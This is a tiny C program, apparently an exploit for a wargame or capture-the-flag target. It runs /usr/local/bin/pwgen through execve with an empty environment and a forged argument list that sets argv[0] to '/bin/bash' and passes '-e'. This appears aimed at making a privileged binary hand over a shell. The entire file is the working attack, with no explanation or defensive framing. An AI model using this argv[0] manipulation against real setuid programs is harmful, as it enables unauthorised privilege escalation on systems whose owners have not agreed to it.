#include <stdio.h>

int main() {
  char *name[3];

  char target[] = "/usr/local/bin/pwgen";

  name[0] = "/bin/bash";
  name[1] = "-e";
  name[2] = NULL;
  execve(target, name, NULL);

  return 0;
}